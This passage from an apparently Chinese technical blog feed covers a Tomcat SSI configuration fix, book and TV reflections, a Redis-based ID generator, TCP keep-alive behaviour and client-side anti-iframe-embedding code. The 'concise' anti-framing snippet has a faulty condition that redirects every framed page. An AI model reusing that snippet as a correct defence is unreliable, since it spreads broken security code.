class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>7.0.58的代码：<br><a href="https://svn.apache.org/repos/asf/tomcat/tc7.0.x/tags/TOMCAT_7_0_58/java/org/apache/catalina/core/ApplicationContext.java" target="_blank" rel="noopener">https://svn.apache.org/repos/asf/tomcat/tc7.0.x/tags/TOMCAT_7_0_58/java/org/apache/catalina/core/ApplicationContext.java</a></p>
<p>那么正确的处理办法是怎样的？</p>
<p>仔细查看Tomcat的SSI配置的说明文档，发现有一个isVirtualWebappRelative的配置，而这个配置默认是false的。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">isVirtualWebappRelative - Should &quot;virtual&quot; SSI directive paths be interpreted as relative to the context root, instead of the server root? Default false.</span><br></pre></td></tr></table></figure></p>
<p><strong>也就是说，如果要支持“#include virtual=”/b.shtml”绝对路径这种指令，就要配置isVirtualWebappRelative为true。<br>但是tomcat默认的SSI配置，以及上面的EnhancedSSIServlet类默认都配置isVirtualWebappRelative为false。</strong></p>
<p>因此，把EnhancedSSIServlet类里的isVirtualWebappRelative配置为true，重新测试，发现已经可以正常处理”#include virtual=”/b.shtml”指令了。</p>
<p>相关的逻辑处理的代码在org.apache.catalina.ssi.SSIServletExternalResolver.getServletContextAndPathFromVirtualPath( String virtualPath)：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> ServletContextAndPath <span class="title">getServletContextAndPathFromVirtualPath</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">         String virtualPath)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">     <span class="keyword">if</span> (!virtualPath.startsWith(<span class="string">"/"</span>) &amp;&amp; !virtualPath.startsWith(<span class="string">"\\"</span>)) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> ServletContextAndPath(context,</span><br><span class="line">                 getAbsolutePath(virtualPath));</span><br><span class="line">     &#125;</span><br><span class="line">     String normalized = RequestUtil.normalize(virtualPath);</span><br><span class="line">     <span class="keyword">if</span> (isVirtualWebappRelative) &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">new</span> ServletContextAndPath(context, normalized);</span><br><span class="line">     &#125;</span><br><span class="line">     ServletContext normContext = context.getContext(normalized);</span><br><span class="line">     <span class="keyword">if</span> (normContext == <span class="keyword">null</span>) &#123;</span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Couldn't get context for path: "</span></span><br><span class="line">                 + normalized);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>之前的EnhancedSSIServlet类的配置就不支持”#include virtual=”/b.shtml”，这种绝对路径的SSI指令，而以前版本的Tomcat因为恰好处理了”/test.shtml”这种以”/“开头的url，因此以前版本的Tomcat没有报错。而升级后的Tomcat修正了代码，不再处理这种不合理的绝对路径请求了，所以报“ Couldn’t get context for path”的异常。</p>
<p>把tomcat的ssi配置里的isVirtualWebappRelative设置为true就可以了。</p>
<p>最后，留一个小问题：</p>
<p><strong>tomcat是如何知道处理*.jsp请求的？是哪个servlet在起作用？</strong></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://tomcat.apache.org/tomcat-7.0-doc/ssi-howto.html" target="_blank" rel="noopener">https://tomcat.apache.org/tomcat-7.0-doc/ssi-howto.html</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>tomcat</tag>
        <tag>ssi</tag>
      </tags>
  </entry>
  <entry>
    <title>《一百个人的十年》和《1984》</title>
    <url>/ten-years-of-madness-and-1984/</url>
    <content><![CDATA[<p>推荐先看《一百个人的十年》，再看《1984》。两本书都比较压抑，注意舒缓心情。</p>
<h3 id="《一百个人的十年》"><a href="#《一百个人的十年》" class="headerlink" title="《一百个人的十年》"></a>《一百个人的十年》</h3><p>前一段时间在微博上有一个比较火的文章《拾纸救夫》，是冯骥才的《一百个人的十年》里的第一个故事。我看了之后，决定去看下完整的《一百个人的十年》。</p>
<p>今天在写这个blog的时候，本来想找个《拾纸救夫》的链接的，却发现网上的版本都是删节过的。建议还是去看下完整版的，里面有很多细节。</p>
<p>作者之所以把《拾纸救夫》作为第一个故事，因为它的非常震撼人心。同为小人物的我，在读完只觉得全身都冰凉。</p>
<p>作者是亲自录音，笔录采访，花了十多年才完成这部纪实作品，很值得一读。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    于一九八六年,开始进行这部名为 《一百个人的十年》的口述实录文学。</span><br><span class="line">由此至今, 已近十载,收到要求被采访者信件近四千封,采访数百人;摘其所具独特性且富于深刻者撰文成书。 </span><br><span class="line">                                                         --《关于本书写作的缘起》</span><br></pre></td></tr></table></figure>
<h3 id="《1984》"><a href="#《1984》" class="headerlink" title="《1984》"></a>《1984》</h3><p>在看了《一百个人的十年》之后，偶然看到了《1984》的名字。尽管之前多次看到这个名字，而且也在自己的收藏书单里，但是却从没有开始读过。这次下决心读完。</p>
<p>在看《1984》的过程中，一度以为是写来讽剌文革的。但是在看了一些书评之后，发现成书于1949年。作者是有感于二战的历史而写的。据说在文革时，《1984》在中国也有流传，可以想像当时的人是怀着怎样的心情在读着这本书的。而在读完之后，又是怀着怎样的心情揣测着自己的未来。</p>
<p>有时候人们（包括我自己）会有一种想法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">这么荒唐的事情怎么会发生？这样的事情在今后是不可能再发生了。</span><br></pre></td></tr></table></figure>
<p>在二战前，很多人都认为二战不会爆发。在今天，很多人也无法理解当年文革的情形。</p>
<p>所以，要保持谦卑谨慎，保持警惕，很多事情都有可能发生。</p>
]]></content>
      <categories>
        <category>读书</category>
      </categories>
      <tags>
        <tag>读书</tag>
        <tag>1984</tag>
      </tags>
  </entry>
  <entry>
    <title>基于redis的分布式ID生成器</title>
    <url>/redis-id-generator/</url>
    <content><![CDATA[<h2 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h2><p><a href="https://github.com/hengyunabc/redis-id-generator" target="_blank" rel="noopener">https://github.com/hengyunabc/redis-id-generator</a></p>
<p>基于redis的分布式ID生成器。</p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>首先，要知道redis的EVAL，EVALSHA命令：</p>
<p><a href="http://redis.readthedocs.org/en/latest/script/eval.html" target="_blank" rel="noopener">http://redis.readthedocs.org/en/latest/script/eval.html</a></p>
<p><a href="http://redis.readthedocs.org/en/latest/script/evalsha.html" target="_blank" rel="noopener">http://redis.readthedocs.org/en/latest/script/evalsha.html</a></p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用redis的lua脚本执行功能，在每个节点上通过lua脚本生成唯一ID。<br>生成的ID是64位的：</p>
<ul>
<li>使用41 bit来存放时间，精确到毫秒，可以使用41年。  </li>
<li>使用12 bit来存放逻辑分片ID，最大分片ID是4095</li>
<li>使用10 bit来存放自增长ID，意味着每个节点，每毫秒最多可以生成1024个ID  </li>
</ul>
<p>比如GTM时间 <code>Fri Mar 13 10:00:00 CST 2015</code> ，它的距1970年的毫秒数是 <code>1426212000000</code>，假定分片ID是53，自增长序列是4，则生成的ID是：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5981966696448054276 = 1426212000000 &lt;&lt; 22 + 53 &lt;&lt; 10 + 4</span><br></pre></td></tr></table></figure>
<p>redis提供了<a href="http://redis.readthedocs.org/en/latest/server/time.html" target="_blank" rel="noopener">TIME</a>命令，可以取得redis服务器上的秒数和微秒数。因些lua脚本返回的是一个四元组。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">second, microSecond, partition, seq</span><br></pre></td></tr></table></figure>
<p>客户端要自己处理，生成最终ID。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">((second * 1000 + microSecond / 1000) &lt;&lt; (12 + 10)) + (shardId &lt;&lt; 10) + seq;</span><br></pre></td></tr></table></figure>
<h3 id="集群实现原理"><a href="#集群实现原理" class="headerlink" title="集群实现原理"></a>集群实现原理</h3><p>假定集群里有3个节点，则节点1返回的seq是：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0, 3, 6, 9, 12 ...</span><br></pre></td></tr></table></figure></p>
<p>节点2返回的seq是<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1, 4, 7, 10, 13 ...</span><br></pre></td></tr></table></figure></p>
<p>节点3返回的seq是<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2, 5, 8, 11, 14 ...</span><br></pre></td></tr></table></figure></p>
<p>这样每个节点返回的数据都是唯一的。</p>
<h2 id="单个节点部署"><a href="#单个节点部署" class="headerlink" title="单个节点部署"></a>单个节点部署</h2><p>下载redis-script-node1.lua，并把它load到redis上。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> redis-directory/</span><br><span class="line">wget https://raw.githubusercontent.com/hengyunabc/redis-id-generator/master/redis-script-node1.lua</span><br><span class="line">./redis-cli script load <span class="string">"<span class="variable">$(cat redis-script-node1.lua)</span>"</span></span><br></pre></td></tr></table></figure></p>
<p>获取lua脚本的sha1值，可能是：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fce3758b2e0af6cbf8fea4d42b379cd0dc374418</span><br></pre></td></tr></table></figure></p>
<p>在代码里，通过EVALSHA命令，传递这个sha1值，就可以得到生成的ID。</p>
<p>比如，通过命令行执行：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./redis-cli EVALSHA fce3758b2e0af6cbf8fea4d42b379cd0dc374418 2 <span class="built_in">test</span> 123456789</span><br></pre></td></tr></table></figure></p>
<p>结果可能是：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1) (integer) 1426238286</span><br><span class="line">2) (integer) 130532</span><br><span class="line">3) (integer) 277</span><br><span class="line">4) (integer) 4</span><br></pre></td></tr></table></figure></p>
<h2 id="集群部署"><a href="#集群部署" class="headerlink" title="集群部署"></a>集群部署</h2><p>假定集群是3个节点，则分别对三个节点执行：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./redis-cli -host node1 -p 6379 script load <span class="string">"<span class="variable">$(cat redis-script-node1.lua)</span>"</span> </span><br><span class="line">./redis-cli -host node2 -p 7379 script load <span class="string">"<span class="variable">$(cat redis-script-node2.lua)</span>"</span> </span><br><span class="line">./redis-cli -host node3 -p 8379 script load <span class="string">"<span class="variable">$(cat redis-script-node3.lua)</span>"</span></span><br></pre></td></tr></table></figure></p>
<h2 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h2><p>redis默认配置。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">单节点，单线程：</span><br><span class="line">time:0:00:00.959</span><br><span class="line">speed:10427.52867570386</span><br><span class="line">单节点，20线程：</span><br><span class="line">time:0:00:06.710</span><br><span class="line">speed:29806.259314456034</span><br></pre></td></tr></table></figure>
<p>结论：</p>
<ul>
<li>单节点，qps约3w</li>
<li>可以线性扩展，3个结点足以满足绝大部分的应用</li>
</ul>
<h2 id="java客户端封装"><a href="#java客户端封装" class="headerlink" title="java客户端封装"></a>java客户端封装</h2><p>在redis-id-generator-java目录下，有example和benchmark代码。</p>
<p>在调用时，要传入两个参数</p>
<ul>
<li>tag，即为哪一类服务生成ID</li>
<li>shardId，即分片由哪个ID生成，比如一个用户的订单，则分片ID应该由userId来生成</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		String tab = <span class="string">"order"</span>;</span><br><span class="line">		<span class="keyword">long</span> userId = <span class="number">123456789</span>;</span><br><span class="line"></span><br><span class="line">		IdGenerator idGenerator = IdGenerator.builder()</span><br><span class="line">				.addHost(<span class="string">"127.0.0.1"</span>, <span class="number">6379</span>, <span class="string">"fce3758b2e0af6cbf8fea4d42b379cd0dc374418"</span>)</span><br><span class="line"><span class="comment">//				.addHost("127.0.0.1", 7379, "1abc55928f37176cb934fc7a65069bf32282d817")</span></span><br><span class="line"><span class="comment">//				.addHost("127.0.0.1", 8379, "b056d20feb3f89483b10c81027440cbf6920f74f")</span></span><br><span class="line">				.build();</span><br><span class="line"></span><br><span class="line">		<span class="keyword">long</span> id = idGenerator.next(tab, userId);</span><br><span class="line"></span><br><span class="line">		System.out.println(<span class="string">"id:"</span> + id);</span><br><span class="line">		List&lt;Long&gt; result = IdGenerator.parseId(id);</span><br><span class="line"></span><br><span class="line">		System.out.println(<span class="string">"miliSeconds:"</span> + result.get(<span class="number">0</span>) + <span class="string">", partition:"</span></span><br><span class="line">				+ result.get(<span class="number">1</span>) + <span class="string">", seq:"</span> + result.get(<span class="number">2</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="多语言客户端"><a href="#多语言客户端" class="headerlink" title="多语言客户端"></a>多语言客户端</h2><p>只要支持redis evalsha命令就可以了。</p>
<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2><p>之前写的一个blog：<a href="http://blog.csdn.net/hengyunabc/article/details/19025973" target="_blank" rel="noopener">分片(Sharding)的全局ID生成</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>redis</tag>
        <tag>lua</tag>
      </tags>
  </entry>
  <entry>
    <title>为什么基于TCP的应用需要心跳包（TCP keep-alive原理分析）</title>
    <url>/why-we-need-heartbeat/</url>
    <content><![CDATA[<h2 id="TCP-keep-alive的三个参数"><a href="#TCP-keep-alive的三个参数" class="headerlink" title="TCP keep-alive的三个参数"></a>TCP keep-alive的三个参数</h2><p>用man命令，可以查看linux的tcp的参数：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">man 7 tcp</span><br></pre></td></tr></table></figure></p>
<p>其中keep-alive相关的参数有三个：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcp_keepalive_intvl (integer; default: 75; since Linux 2.4)</span><br><span class="line">       The number of seconds between TCP keep-alive probes.</span><br><span class="line"></span><br><span class="line">tcp_keepalive_probes (integer; default: 9; since Linux 2.2)</span><br><span class="line">       The  maximum  number  of  TCP  keep-alive  probes  to send before giving up and killing the connection if no</span><br><span class="line">       response is obtained from the other end.</span><br><span class="line"></span><br><span class="line">tcp_keepalive_time (integer; default: 7200; since Linux 2.2)</span><br><span class="line">       The number of seconds a connection needs to be idle before TCP begins sending out keep-alive probes.   Keep-</span><br><span class="line">       alives  are  sent only when the SO_KEEPALIVE socket option is enabled.  The default value is 7200 seconds (2</span><br><span class="line">       hours).  An idle connection is terminated after approximately an additional 11 minutes (9 probes an interval</span><br><span class="line">       of 75 seconds apart) when keep-alive is enabled.</span><br></pre></td></tr></table></figure></p>
<p>这些的默认配置值在/proc/sys/net/ipv4 目录下可以找到。</p>
<p>可以直接用cat来查看文件的内容，就可以知道配置的值了。<br>也可以通过sysctl命令来查看和修改：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查询</span></span><br><span class="line">cat /proc/sys/net/ipv4/tcp_keepalive_time</span><br><span class="line">sysctl net.ipv4.tcp_keepalive_time</span><br><span class="line"><span class="comment">#修改</span></span><br><span class="line">sysctl net.ipv4.tcp_keepalive_time=3600</span><br></pre></td></tr></table></figure></p>
<p>上面三个是系统级的配置，在编程时有三个参数对应，可以覆盖掉系统的配置：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TCP_KEEPCNT 覆盖  tcp_keepalive_probes，默认9（次）</span><br><span class="line">TCP_KEEPIDLE 覆盖 tcp_keepalive_time，默认7200（秒）</span><br><span class="line">TCP_KEEPINTVL 覆盖 tcp_keepalive_intvl，默认75（秒）</span><br></pre></td></tr></table></figure></p>
<h2 id="tcp-keep-alive的本质"><a href="#tcp-keep-alive的本质" class="headerlink" title="tcp keep-alive的本质"></a>tcp keep-alive的本质</h2><h3 id="TCP-keep-alive-probe"><a href="#TCP-keep-alive-probe" class="headerlink" title="TCP keep-alive probe"></a>TCP keep-alive probe</h3><p>上面了解了tcp keep-alive的一些参数，下面来探究下其本质。</p>
<p>在远程机器192.168.66.123上，用nc启动一个TCP服务器：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -l 9999</span><br></pre></td></tr></table></figure></p>
<p>在本地机器上，用python创建一个socket去连接，并且用wireshark抓包分析<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line">s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, <span class="number">1</span>)</span><br><span class="line">s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, <span class="number">20</span>)</span><br><span class="line">s.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">s.connect((<span class="string">'192.168.66.123'</span>, <span class="number">9999</span>))</span><br></pre></td></tr></table></figure></p>
<p>上面的程序，<strong>设置了TCP_KEEPIDLE为20，TCP_KEEPINTVL为1，系统默认的tcp_keepalive_probes是9。</strong></p>
<p>当网络正常，不做干扰时，wireshark抓包的数据是这样的（注意看第二列Time）：</p>
<p><img src="/img/tcp-keepalive-good.png" alt="tcp-keepalive-good.png"></p>
<p><strong>可以看到，当3次握手完成之后，每隔20秒之后66.120发送了一个TCP Keep-Alive的数据包，然后66.123回应了一个TCP Keep-Alive ACK包。这个就是TCP keep-alive的实现原理了。</strong></p>
<p>当发送了第一个TCP Keep-Alive包之后，拨掉192.168.66.123的网线，然后数据包是这样子的：<br><img src="/img/tcp-keepalive-bad.png" alt="tcp-keepalive-bad.png"></p>
<p>可以看到，当远程服务器192.168.66.123网络失去连接之后，本地机器（192.168.66.120）每隔一秒重发了9次tcp keep-alive probe，最终认为这个TCP连接已经失效，发了一个RST包给192.168.66.123。</p>
<h3 id="三个参数的具体意义"><a href="#三个参数的具体意义" class="headerlink" title="三个参数的具体意义"></a>三个参数的具体意义</h3><p>TCP_KEEPIDLE ：这个参数是多久没有发送数据时，开始发送Keep-Alive包的时间，也就是链路空闲时间。<br>TCP_KEEPINTVL：这个参数是指发送Keep-Alive probe后，对方多久没有回应，然后重新再发送keep alive probe的时间间隔<br>TCP_KEEPCNT：这个参数指，连续发送多少次keep alive probe，对方没有回应，认为连接已经失效的重试次数</p>
<p><strong>如果不能理解或者有混淆，仔细对照下上面的两张图片就可以明白了。</strong></p>
<h2 id="为什么应用层需要heart-beat-心跳包？"><a href="#为什么应用层需要heart-beat-心跳包？" class="headerlink" title="为什么应用层需要heart beat/心跳包？"></a>为什么应用层需要heart beat/心跳包？</h2><h3 id="默认的tcp-keep-alive超时时间太长"><a href="#默认的tcp-keep-alive超时时间太长" class="headerlink" title="默认的tcp keep-alive超时时间太长"></a>默认的tcp keep-alive超时时间太长</h3><p>默认是7200秒，也就是2个小时。</p>
<h3 id="socks-proxy会让tcp-keep-alive失效"><a href="#socks-proxy会让tcp-keep-alive失效" class="headerlink" title="socks proxy会让tcp keep-alive失效"></a>socks proxy会让tcp keep-alive失效</h3><p>socks协议只管转发TCP层具体的数据包，而不会转发TCP协议内的实现细节的包（也做不到），<a href="http://hengyunabc.github.io/something-about-science-surf-the-internet/#socks_proxy">参考socks_proxy</a>。</p>
<p>所以，一个应用如果使用了socks代理，那么tcp keep-alive机制就失效了，所以应用要自己有心跳包。</p>
<p><strong>socks proxy只是一个例子，真实的网络很复杂，可能会有各种原因让tcp keep-alive失效。</strong></p>
<h3 id="移动网络需要信令保活"><a href="#移动网络需要信令保活" class="headerlink" title="移动网络需要信令保活"></a>移动网络需要信令保活</h3><p>前两年，微信信令事件很火，搜索下“微信 信令”或者“移动网络 信令”可以查到很多相关文章。</p>
<p>这里附上一个链接：<a href="http://www.zhihu.com/question/20849677/answer/16384522" target="_blank" rel="noopener">微信的大规模使用真的会过多占用信令，影响通讯稳定吗？</a></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><p>TCP keep-alive是通过在空闲时发送TCP Keep-Alive数据包，然后对方回应TCP Keep-Alive ACK来实现的。</p>
</li>
<li><p>为什么需要heart beat/心跳包？因为tcp keep-alive不能满足人们的实时性的要求，就是这么简单。</p>
</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>socket</tag>
        <tag>tcp</tag>
        <tag>wireshark</tag>
        <tag>网络</tag>
      </tags>
  </entry>
  <entry>
    <title>《北京人在纽约》</title>
    <url>/about-A-Native-of-Beijing-in-New-York/</url>
    <content><![CDATA[<p>在过年前，看到了这则新闻：<a href="http://edu.163.com/15/0215/09/AIG0E21D00294KMJ.html" target="_blank" rel="noopener">儿女很近 幸福很远:美国华裔老人的悲惨生活</a>。另外，也在微博看到一些信息，很多留学生选择回到中国。</p>
<p>忽然很想看下<a href="http://movie.douban.com/subject/2189642/" target="_blank" rel="noopener">《北京人在纽约》</a>，了解下当年移民到美国的人的心态。</p>
<p>在网上找了一阵子，在土豆上找到有字幕的：</p>
<p><a href="http://www.tudou.com/albumcover/5w7hXnW8xdI.html" target="_blank" rel="noopener">http://www.tudou.com/albumcover/5w7hXnW8xdI.html</a></p>
<p>过年时看完了，也谈不上什么感想。</p>
<p>意外地发现了导演居然是冯小刚，艾=未-来。冯小刚在电影的最后还打了个酱油。</p>
<p>本来以为当年移民美国的人，以读书，技术移民比较多。没想到像王启明/郭燕这样不会英语的人，也敢出国。电视剧的结尾，非常贴心的告诉观众，三年后主角们的状况。而如果他们真实存在，现在也变成老人了，不知会如何。移民必然会有很多故事，无所谓值不值得与后悔。</p>
<p>扯远一点，毫无疑问，现在国人的民族自豪感大大增强了。记得以前和同学谈话时，说到民族自豪感：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">村与村之间有斗争，打架，没有人敢欺负比较团结、流氓的村。</span><br><span class="line">如果某条村子被欺负了，而不能争回面子的话，那么村民也抬不起头来。国家之间也是如此。</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>文化</category>
      </categories>
  </entry>
  <entry>
    <title>Cookie &amp; Session &amp; CSRF</title>
    <url>/cookie-and-session-and-csrf/</url>
    <content><![CDATA[<p>在线幻灯片地址： <a href="/slides/cookie-and-session-and-csrf.html">Cookie &amp; Session &amp; CSRF</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>spring</tag>
        <tag>cookie</tag>
        <tag>session</tag>
        <tag>nginx</tag>
        <tag>CSRF</tag>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>防止页面被iframe恶意嵌套</title>
    <url>/prevent-iframe-stealing/</url>
    <content><![CDATA[<h2 id="缘起"><a href="#缘起" class="headerlink" title="缘起"></a>缘起</h2><p>在看资料时，看到这样的防止iframe嵌套的代码：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">window</span>.top != <span class="built_in">window</span>.self) &#123;</span><br><span class="line">        <span class="keyword">var</span> ref = <span class="built_in">document</span>.referer;</span><br><span class="line">        <span class="keyword">if</span> (ref.substring(<span class="number">0</span>, <span class="number">2</span>) === <span class="string">'//'</span>) &#123;</span><br><span class="line">            ref = <span class="string">'http:'</span> + ref;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ref.split(<span class="string">'://'</span>).length === <span class="number">1</span>) &#123;</span><br><span class="line">            ref = <span class="string">'http://'</span> + ref;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> url = ref.split(<span class="string">'/'</span>);</span><br><span class="line">        <span class="keyword">var</span> _l = &#123;<span class="attr">auth</span>: <span class="string">''</span>&#125;;</span><br><span class="line">        <span class="keyword">var</span> host = url[<span class="number">2</span>].split(<span class="string">'@'</span>);</span><br><span class="line">        <span class="keyword">if</span> (host.length === <span class="number">1</span>) &#123;</span><br><span class="line">            host = host[<span class="number">0</span>].split(<span class="string">':'</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            _l.auth = host[<span class="number">0</span>];</span><br><span class="line">            host = host[<span class="number">1</span>].split(<span class="string">':'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> parentHostName = host[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (parentHostName.indexOf(<span class="string">"test.com"</span>) == <span class="number">-1</span> &amp;&amp; parentHostName.indexOf(<span class="string">"test2.com"</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">            top.location.href = <span class="string">"http://www.test.com"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>假定test.com，test2.com是自己的域名，当其它网站恶意嵌套本站的页面时，跳转回本站的首页。</p>
<p>上面的代码有两个问题：</p>
<ul>
<li>referer拼写错误，实际上应该是referrer</li>
<li>解析referrer的代码太复杂，还不一定正确</li>
</ul>
<p><strong>无论在任何语言里，都不建议手工写代码处理URL。因为url的复杂度超出一般人的想像。很多安全的问题就是因为解析URL不当引起的。比如防止CSRF时判断referrer。</strong></p>
<p>URI的语法：</p>
<p><a href="http://en.wikipedia.org/wiki/URI_scheme#Generic_syntax" target="_blank" rel="noopener">http://en.wikipedia.org/wiki/URI_scheme#Generic_syntax</a></p>
<h2 id="在javascript里解析url最好的办法"><a href="#在javascript里解析url最好的办法" class="headerlink" title="在javascript里解析url最好的办法"></a>在javascript里解析url最好的办法</h2><p>在javascript里解析url的最好办法是利用浏览器的js引擎，通过创建一个a标签：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> getLocation = <span class="function"><span class="keyword">function</span>(<span class="params">href</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> l = <span class="built_in">document</span>.createElement(<span class="string">"a"</span>);</span><br><span class="line">    l.href = href;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> l = getLocation(<span class="string">"http://example.com/path"</span>);</span><br><span class="line"><span class="built_in">console</span>.debug(l.hostname)</span><br></pre></td></tr></table></figure></p>
<h2 id="简洁防iframe恶意嵌套的方法"><a href="#简洁防iframe恶意嵌套的方法" class="headerlink" title="简洁防iframe恶意嵌套的方法"></a>简洁防iframe恶意嵌套的方法</h2><p>下面给出一个简洁的防止iframe恶意嵌套的判断方法：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">window</span>.top != <span class="built_in">window</span> &amp;&amp; <span class="built_in">document</span>.referrer)&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">"a"</span>);</span><br><span class="line">  a.href = <span class="built_in">document</span>.referrer;</span><br><span class="line">  <span class="keyword">var</span> host = a.hostname;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> endsWith = <span class="function"><span class="keyword">function</span> (<span class="params">str, suffix</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> str.indexOf(suffix, str.length - suffix.length) !== <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(!endsWith(host, <span class="string">'.test.com'</span>) || !endsWith(host, <span class="string">'.test2.com'</span>))&#123;</span><br><span class="line">    top.location.href = <span class="string">"http://www.test.com"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="java里处理URL的方法"><a href="#java里处理URL的方法" class="headerlink" title="java里处理URL的方法"></a>java里处理URL的方法</h2><p><a href="http://docs.oracle.com/javase/tutorial/networking/urls/urlInfo.html" target="_blank" rel="noopener">http://docs.oracle.com/javase/tutorial/networking/urls/urlInfo.html</a></p>
<p>用contain, indexOf, endWitch这些函数时都要小心。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">       URL aURL = <span class="keyword">new</span> URL(<span class="string">"http://example.com:80/docs/books/tutorial"</span></span><br><span class="line">                          + <span class="string">"/index.html?name=networking#DOWNLOADING"</span>);</span><br><span class="line"></span><br><span class="line">       System.out.println(<span class="string">"protocol = "</span> + aURL.getProtocol());</span><br><span class="line">       System.out.println(<span class="string">"authority = "</span> + aURL.getAuthority());</span><br><span class="line">       System.out.println(<span class="string">"host = "</span> + aURL.getHost());</span><br><span class="line">       System.out.println(<span class="string">"port = "</span> + aURL.getPort());</span><br><span class="line">       System.out.println(<span class="string">"path = "</span> + aURL.getPath());</span><br><span class="line">       System.out.println(<span class="string">"query = "</span> + aURL.getQuery());</span><br><span class="line">       System.out.println(<span class="string">"filename = "</span> + aURL.getFile());</span><br><span class="line">       System.out.println(<span class="string">"ref = "</span> + aURL.getRef());</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
